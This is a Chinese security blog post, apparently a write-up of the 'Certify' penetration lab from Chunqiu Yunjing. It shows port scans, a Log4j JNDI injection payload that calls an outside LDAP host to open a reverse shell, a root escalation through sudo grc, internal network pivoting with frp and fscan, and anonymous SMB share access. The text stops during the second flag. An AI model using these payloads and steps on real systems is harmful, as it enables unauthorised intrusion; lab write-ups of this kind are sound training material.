@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>春秋云镜-Certify - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='春秋云镜'>
+  <meta itemprop="name" content="春秋云镜-Certify">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-05-07T19:15:35+08:00">
+  <meta itemprop="dateModified" content="2025-05-07T19:15:35+08:00">
+  <meta itemprop="wordCount" content="1963">
+  <meta itemprop="image" content="https://nlrvana.github.io/avatar.png">
+  <meta itemprop="keywords" content="春秋云镜"><meta property="og:url" content="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="春秋云镜-Certify">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-07T19:15:35+08:00">
+    <meta property="article:modified_time" content="2025-05-07T19:15:35+08:00">
+    <meta property="article:tag" content="春秋云镜">
+    <meta property="og:image" content="https://nlrvana.github.io/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://nlrvana.github.io/avatar.png">
+  <meta name="twitter:title" content="春秋云镜-Certify">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/" title="春秋云镜-Certify - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/" title="春秋云镜-Brute4Road" /><link rel="next" type="text/html" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time/" title="春秋云镜-Time" /><link rel="alternate" type="text/markdown" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/index.md" title="春秋云镜-Certify - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "春秋云镜-Certify",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify\/"
+    },"genre": "posts","keywords": "春秋云镜","wordcount":  1963 ,
+    "url": "https:\/\/nlrvana.github.io\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify\/","datePublished": "2025-05-07T19:15:35+08:00","dateModified": "2025-05-07T19:15:35+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">春秋云镜-Certify</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>春秋云镜-Certify</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category" title="Category - 内网渗透"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 内网渗透</a>&ensp;<a href="/categories/adcs/" class="post-category" title="Category - ADCS"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> ADCS</a>&ensp;<a href="/categories/ecs1/" class="post-category" title="Category - ECS1"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> ECS1</a></span></div><div class="post-meta-line"><span title="published on 2025-05-07 19:15:35"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-07">2025-05-07</time></span>&nbsp;<span title="1963 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="春秋云镜-Certify"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#flag01">flag01</a></li>
+    <li><a href="#0x02-flag02">0x02 flag02</a></li>
+    <li><a href="#flag03flag04">flag03&amp;flag04</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="flag01" class="heading-element"><span>flag01</span>
+  <a href="#flag01" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./fscan_mac -h 39.98.127.236  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">   ___                              _  
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __  
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /  
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;  
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span> 
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.3  
+</span></span><span class="line"><span class="cl">start infoscan  
+</span></span><span class="line"><span class="cl">39.98.127.236:21 open  
+</span></span><span class="line"><span class="cl">39.98.127.236:80 open  
+</span></span><span class="line"><span class="cl">39.98.127.236:22 open  
+</span></span><span class="line"><span class="cl">39.98.127.236:8983 open  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">4</span>  
+</span></span><span class="line"><span class="cl">start vulscan  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://39.98.127.236      code:200 len:612    title:Welcome to nginx!  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://39.98.127.236:8983 code:302 len:0      title:None 跳转url: http://39.98.127.236:8983/solr/  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://39.98.127.236:8983/solr/ code:200 len:16555  title:Solr Admin  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>http://39.98.127.236:8983/solr/#/</code> 存在<code>log4j</code>漏洞，直接打JNDI注入。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/solr/admin/collections?action=${jndi:ldap://8.137.71.171:1389/Basic/ReverseShell/8.137.71.171/1234}  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得<code>shell</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code><br>
+<code>sudo -l</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+利用<code>grc</code>提权<br>
+<a href="https://gtfobins.github.io/gtfobins/grc/"target="_blank" rel="external nofollow noopener noreferrer">https://gtfobins.github.io/gtfobins/grc/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo grc --pty /bin/sh  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{ccdcbc43-b91b-4f66-ab7d-cbdca7ad6ebb}</code></p>
+<h2 id="0x02-flag02" class="heading-element"><span>0x02 flag02</span>
+  <a href="#0x02-flag02" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上传<code>frp</code>和<code>fscan</code><br>
+<code>ifconfig</code>得到内网<code>IP</code><br>
+<code>172.22.9.19</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nohup ./frpc -c frpc.ini <span class="p">&amp;</span>  
+</span></span><span class="line"><span class="cl">nohup ./fscan -h 172.22.9.19/24 <span class="p">&amp;</span>  
+</span></span><span class="line"><span class="cl">root@ubuntu:/opt/solr-8.11.0/server# cat result.txt  
+</span></span><span class="line"><span class="cl">cat result.txt  
+</span></span><span class="line"><span class="cl">172.22.9.47:21 open  
+</span></span><span class="line"><span class="cl">172.22.9.47:80 open  
+</span></span><span class="line"><span class="cl">172.22.9.7:80 open  
+</span></span><span class="line"><span class="cl">172.22.9.47:22 open  
+</span></span><span class="line"><span class="cl">172.22.9.19:80 open  
+</span></span><span class="line"><span class="cl">172.22.9.19:22 open  
+</span></span><span class="line"><span class="cl">172.22.9.7:88 open  
+</span></span><span class="line"><span class="cl">172.22.9.19:8983 open  
+</span></span><span class="line"><span class="cl">172.22.9.26:445 open  
+</span></span><span class="line"><span class="cl">172.22.9.47:445 open  
+</span></span><span class="line"><span class="cl">172.22.9.7:445 open  
+</span></span><span class="line"><span class="cl">172.22.9.26:139 open  
+</span></span><span class="line"><span class="cl">172.22.9.47:139 open  
+</span></span><span class="line"><span class="cl">172.22.9.26:135 open  
+</span></span><span class="line"><span class="cl">172.22.9.7:139 open  
+</span></span><span class="line"><span class="cl">172.22.9.7:135 open  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.9.7  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-DC  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.9.7  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.9.26  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>DESKTOP-CBKTVMO  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.9.26  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.9.7      <span class="o">[</span>+<span class="o">]</span> DC:XIAORANG<span class="se">\X</span>IAORANG-DC      
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.9.47     fileserver                          Windows 6.1  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.9.47  <span class="o">(</span>Windows 6.1<span class="o">)</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect   </span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到存活IP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.22.9.7 XIAORANG-DC   
+</span></span><span class="line"><span class="cl">172.22.9.19 Solr Admin        
+</span></span><span class="line"><span class="cl">172.22.9.26 DESKTOP-CBKTVMO   
+</span></span><span class="line"><span class="cl">172.22.9.47 fileserver  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中存在<code>fileserver</code>，可能是文件共享，尝试登陆一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nlrvana @ MacBookPro in ~/Desktop/HackTools [20:08:47]  </span>
+</span></span><span class="line"><span class="cl">$ smbclient -L 172.22.9.47  
+</span></span><span class="line"><span class="cl">Can<span class="s1">&#39;t load /opt/homebrew/etc/smb.conf - run testparm to debug it  
+</span></span></span><span class="line"><span class="cl"><span class="s1">Password for [WORKGROUP\nlrvana]:  
+</span></span></span><span class="line"><span class="cl"><span class="s1">  
+</span></span></span><span class="line"><span class="cl"><span class="s1">	Sharename       Type      Comment  
+</span></span></span><span class="line"><span class="cl"><span class="s1">	---------       ----      -------  
+</span></span></span><span class="line"><span class="cl"><span class="s1">	print$          Disk      Printer Drivers  
+</span></span></span><span class="line"><span class="cl"><span class="s1">	fileshare       Disk      bill share  
+</span></span></span><span class="line"><span class="cl"><span class="s1">	IPC$            IPC       IPC Service (fileserver server (Samba, Ubuntu))  
+</span></span></span><span class="line"><span class="cl"><span class="s1">SMB1 disabled -- no workgroup available  
+</span></span></span><span class="line"><span class="cl"><span class="s1"># nlrvana @ MacBookPro in ~/Desktop/HackTools [20:09:30] C:1  
+</span></span></span><span class="line"><span class="cl"><span class="s1">$ smbclient //172.22.9.47/fileshare  
+</span></span></span><span class="line"><span class="cl"><span class="s1">Can&#39;</span>t load /opt/homebrew/etc/smb.conf - run testparm to debug it  
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\n</span>lrvana<span class="o">]</span>:  
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.  
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>根目录获得<code>personnel.db</code>，在<code>secret/flag02.txt</code>获得<code>flag</code><br>
